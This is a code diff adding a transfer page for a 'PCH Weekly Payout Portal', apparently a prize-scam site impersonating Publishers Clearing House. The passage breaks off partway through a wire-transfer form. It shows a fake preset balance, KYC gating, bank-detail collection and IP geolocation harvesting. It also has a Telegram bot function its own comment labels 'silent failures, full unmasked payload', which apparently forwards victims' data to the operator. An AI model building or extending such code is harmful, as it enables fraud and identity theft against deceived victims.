@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Transfer — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  @keyframes pulseDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.55; transform:scale(.85); } }
+  .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  @supports (-webkit-touch-callout: none) {
+    .blur-3xl { -webkit-transform: translate3d(0,0,0); transform: translate3d(0,0,0); -webkit-backface-visibility: hidden; backface-visibility: hidden; will-change: transform; }
+  }
+  .p2p-suggestion { display:flex; align-items:center; gap:.65rem; padding:.65rem .85rem; cursor:pointer; border-bottom:1px solid rgba(33,45,84,.5); transition:background .15s; }
+  .p2p-suggestion:hover, .p2p-suggestion.active { background:rgba(56,189,248,.08); }
+  .p2p-suggestion .p2p-avatar { width:2rem; height:2rem; border-radius:.6rem; background:linear-gradient(145deg,#fbbf24,#d97706); color:#070b19; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:.75rem; flex-shrink:0; }
+  .p2p-suggestion .p2p-info { min-width:0; flex:1; }
+  .p2p-suggestion .p2p-name { font-size:.8rem; font-weight:700; color:#f8fafc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .p2p-suggestion .p2p-handle { font-size:.68rem; color:#38bdf8; font-family:ui-monospace,monospace; }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+  @keyframes successReveal {
+    0% { opacity: 0; transform: rotateY(90deg) scale(0.8); }
+    100% { opacity: 1; transform: rotateY(0deg) scale(1); }
+  }
+  .success-card {
+    animation: successReveal 0.8s cubic-bezier(0.16,1,0.3,1) forwards;
+    transform-style: preserve-3d;
+  }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'', chatId:'' };
+const P2P_MAX_TRANSFER = 50000;
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.favoriteRecipients) parsed.favoriteRecipients = [];
+      if (!parsed.scheduledTransfers) parsed.scheduledTransfers = [];
+      if (!parsed.fundingMethods) parsed.fundingMethods = [];
+      if (!parsed.dailyLimits) parsed.dailyLimits = { withdrawal:{limit:5000,used:0,date:''}, p2p:{limit:50000,used:0,date:''} };
+      if (!parsed.autoWithdraw) parsed.autoWithdraw = { enabled:false, frequency:'weekly', amount:null, method:null };
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], favoriteRecipients:[], scheduledTransfers:[], fundingMethods:[], autoWithdraw:{enabled:false,frequency:'weekly',amount:null,method:null}, dailyLimits:{ withdrawal:{limit:5000,used:0,date:''}, p2p:{limit:50000,used:0,date:''} }, withdrawalState:'none', currentWithdrawal:null, kyc:null, card:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try {
+    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, transactions: state.transactions, dailyLimits: state.dailyLimits });
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
+  } catch(e){}
+}
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    if (r.card) state.card = r.card;
+    if (r.dailyLimits) state.dailyLimits = r.dailyLimits;
+    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+async function pullAllUsersFromCloud() { if (!window.rtdb) return {}; try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users')); return snap.exists() ? snap.val() : {}; } catch(e){ return {}; } }
+function recordDailyUsage(kind, amount){ if (state.dailyLimits[kind]) state.dailyLimits[kind].used = +(state.dailyLimits[kind].used + amount).toFixed(2); saveDeviceState(); }
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ DEVICE + IP ═══════════ */
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  return { os, type, browser };
+}
+let cachedIp = null, cachedGeo = null;
+async function fetchIP(){
+  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        cachedIp = d.ip;
+        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
+        return { ip: cachedIp, ...cachedGeo };
+      }
+    }
+  } catch(e){}
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    if (d && d.ip) { cachedIp = d.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
+  } catch(e){}
+  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
+  return { ip: cachedIp, ...cachedGeo };
+}
+
+/* ═══════════ TELEGRAM — silent failures, full unmasked payload ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ TRANSFER PAGE ═══════════ */
+function getAllSelectableUsers() { const me = (state.currentUser?.username||'').toLowerCase(); return (state.usersCache || []).filter(u => u && u.username && u.username.toLowerCase() !== me); }
+let p2pSuggestionIdx = -1, p2pSuggestionList = [], p2pSelectedUser = null;
+
+function handleP2PInput(e) { p2pSelectedUser = null; const wrap = document.getElementById('p2p-suggestions'); if (!wrap) return; const q = e.target.value.toLowerCase().trim(); if (!q) { wrap.classList.add('hidden'); wrap.innerHTML = ''; p2pSuggestionIdx = -1; p2pSuggestionList = []; return; } const pool = getAllSelectableUsers(); const matches = pool.filter(u => { const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).toLowerCase(); return (u.username||'').toLowerCase().includes(q) || fullName.includes(q) || (u.email||'').toLowerCase().includes(q); }).slice(0, 8); p2pSuggestionList = matches; p2pSuggestionIdx = matches.length > 0 ? 0 : -1; renderP2PSuggestions(); }
+function renderP2PSuggestions() { const wrap = document.getElementById('p2p-suggestions'); if (!wrap) return; if (p2pSuggestionList.length === 0) { wrap.innerHTML = `<div class="p-4 text-center text-[11px] text-slate-500">No users match.</div>`; wrap.classList.remove('hidden'); return; } wrap.innerHTML = p2pSuggestionList.map((u,i)=>{ const fullName = `${u.firstName||''} ${u.lastName||''}`.trim() || u.username; const initials = (u.firstName||u.username||'U').charAt(0).toUpperCase(); return `<div class="p2p-suggestion ${i===p2pSuggestionIdx?'active':''}" onclick="selectP2PUser(${i})"><div class="p2p-avatar">${initials}</div><div class="p2p-info"><div class="p2p-name">${escapeHtml(fullName)}</div><div class="p2p-handle">@${escapeHtml(u.username)}</div></div><i class="fa-solid fa-circle-check text-emerald-400"></i></div>`; }).join(''); wrap.classList.remove('hidden'); }
+function selectP2PUser(i) { const u = p2pSuggestionList[i]; if (!u) return; p2pSelectedUser = u; const input = document.getElementById('p2p-recipient'); if (input) input.value = `@${u.username}`; const wrap = document.getElementById('p2p-suggestions'); if (wrap) { wrap.classList.add('hidden'); wrap.innerHTML = ''; } p2pSuggestionIdx = -1; }
+function handleP2PKeydown(e) { const wrap = document.getElementById('p2p-suggestions'); if (!wrap || wrap.classList.contains('hidden')) { if (e.key === 'ArrowDown') handleP2PInput(e); return; } if (e.key === 'ArrowDown') { e.preventDefault(); p2pSuggestionIdx = Math.min(p2pSuggestionIdx+1, p2pSuggestionList.length-1); renderP2PSuggestions(); } else if (e.key === 'ArrowUp') { e.preventDefault(); p2pSuggestionIdx = Math.max(p2pSuggestionIdx-1, 0); renderP2PSuggestions(); } else if (e.key === 'Enter') { if (p2pSuggestionIdx >= 0 && p2pSuggestionList[p2pSuggestionIdx]) { e.preventDefault(); selectP2PUser(p2pSuggestionIdx); } } }
+document.addEventListener('click', (e)=>{ const wrap = document.getElementById('p2p-suggestions'); const input = document.getElementById('p2p-recipient'); if (wrap && input && !wrap.contains(e.target) && !input.contains(e.target) && e.target !== input) wrap.classList.add('hidden'); });
+
+function renderP2PCard() {
+  const isLocked = isTabLocked('transfer');
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 relative overflow-hidden shadow-2xl">
+    ${isLocked ? `<div class="absolute inset-0 bg-navy-950/80 z-20 flex items-center justify-center rounded-3xl pointer-events-none"><div class="bg-navy-800 border border-rose-500/40 rounded-2xl p-6 text-center max-w-xs pointer-events-auto shadow-2xl"><i class="fa-solid fa-lock text-3xl text-rose-400 mb-3"></i><p class="text-sm font-bold text-white mb-1">Transfers Locked</p><p class="text-[11px] text-slate-400 leading-relaxed mb-4">Complete KYC and Weekly Funds setup to unlock transfers.</p><a href="kyc.html" class="px-4 py-2 bg-rose-500 text-white font-bold rounded-xl text-xs active:scale-95 block">Verify Identity</a></div></div>` : ''}
+    <div class="flex flex-col lg:flex-row gap-8 relative z-10">
+      <div class="flex-1 space-y-5">
+        <h3 class="text-xl sm:text-2xl font-black text-white flex items-center tracking-tight"><div class="w-8 h-8 rounded-xl bg-sky-custom/20 text-sky-custom flex items-center justify-center mr-3 shadow-inner"><i class="fa-solid fa-arrow-right-arrow-left text-sm"></i></div>Instant P2P</h3>
+        <form onsubmit="submitP2PTransfer(event)" class="space-y-4">
+          <div class="relative"><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1.5">Recipient</label><div class="relative"><input type="text" id="p2p-recipient" required autocomplete="off" oninput="handleP2PInput(event)" onkeydown="handleP2PKeydown(event)" placeholder="Search by name or @username..." class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm font-bold text-white focus:outline-none focus:border-sky-custom"><div id="p2p-suggestions" class="hidden absolute left-0 right-0 top-full mt-1 z-50 bg-navy-950 border border-sky-custom/40 rounded-xl shadow-2xl max-h-72 overflow-y-auto"></div></div></div>
+          <div><div class="flex justify-between items-end mb-1.5"><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider">Amount</label><span class="text-[10px] text-slate-400">Avail: <span class="text-gold-400 font-bold">${fmtMoney(state.userBalance)}</span></span></div><input type="number" id="p2p-amount" required min="1" step="0.01" max="${state.userBalance}" placeholder="0.00" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-2xl font-black text-white focus:outline-none focus:border-gold-400"></div>
+          <div><label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1.5">Memo (optional)</label><input type="text" id="p2p-memo" maxlength="80" placeholder="Reference note" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+          <button type="submit" ${isLocked?'disabled':''} class="w-full py-4 mt-2 bg-gradient-to-r from-sky-custom to-emerald-500 text-navy-950 font-black rounded-xl text-sm shadow-xl disabled:opacity-50 active:scale-95 transition"><i class="fa-solid fa-paper-plane mr-2"></i> Send Transfer</button>
+        </form>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="openSplitPaymentModal()" class="px-2 py-2.5 bg-navy-900 border border-navy-700 rounded-xl text-[10px] font-bold text-purple-400 hover:border-purple-400 active:scale-95 transition"><i class="fa-solid fa-users mr-1"></i> Split Payment</button>
+          <button onclick="openQRReceiveModal()" class="px-2 py-2.5 bg-navy-900 border border-navy-700 rounded-xl text-[10px] font-bold text-sky-custom hover:border-sky-custom active:scale-95 transition"><i class="fa-solid fa-qrcode mr-1"></i> QR Receive</button>
+        </div>
+      </div>
+    </div>
+  </div>`;
+}
+
+function renderWireCheckCard() {
+  const isLocked = isTabLocked('transfer');
+  return `<div class="bg-navy-800 border border-purple-500/30 rounded-3xl p-6 sm:p-8 relative overflow-hidden shadow-2xl mt-6">
+    ${isLocked ? `<div class="absolute inset-0 bg-navy-950/80 z-20 flex items-center justify-center rounded-3xl pointer-events-none"><div class="bg-navy-800 border border-rose-500/40 rounded-2xl p-6 text-center max-w-xs pointer-events-auto shadow-2xl"><i class="fa-solid fa-lock text-3xl text-rose-400 mb-3"></i><p class="text-sm font-bold text-white mb-1">Wire Check Locked</p><p class="text-[11px] text-slate-400 mb-4">Complete KYC to unlock.</p></div></div>` : ''}
+    <div class="relative z-10 space-y-5">
+      <div class="flex items-center justify-between"><div><h3 class="text-xl sm:text-2xl font-black text-white flex items-center tracking-tight"><div class="w-8 h-8 rounded-xl bg-purple-500/20 text-purple-400 flex items-center justify-center mr-3 shadow-inner"><i class="fa-solid fa-tower-broadcast text-sm"></i></div>Wire Check</h3></div></div>
+      
+      <div class="bg-navy-900/60 border border-purple-500/20 rounded-2xl p-4 flex items-center justify-between">
+        <div><p class="text-[10px] text-purple-300 uppercase font-black tracking-widest">Available Balance</p><p class="text-lg font-black text-white mt-0.5">${fmtMoney(state.userBalance)}</p></div>
+        <i class="fa-solid fa-wallet text-purple-400 text-xl"></i>
+      </div>
+
+      <form onsubmit="submitWireCheck(event)" class="space-y-5">
+        <div class="bg-navy-900/60 border border-emerald-500/20 rounded-2xl p-4 space-y-3">
+          <p class="text-[10px] text-emerald-300 uppercase font-black tracking-widest flex items-center"><i class="fa-solid fa-arrow-down-to-bracket mr-1.5"></i>Receiver Information</p>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Full Name</label><input type="text" id="wire-receiver-name" required placeholder="Jane Smith" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-400"></div>
+          <div><label class="block text-[10px] font-bold text-slate-400 uppercase mb-1">Bank Name</label><input type="text" id="wire-receiver-bank" required placeholder="Bank of America" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-400"></div>
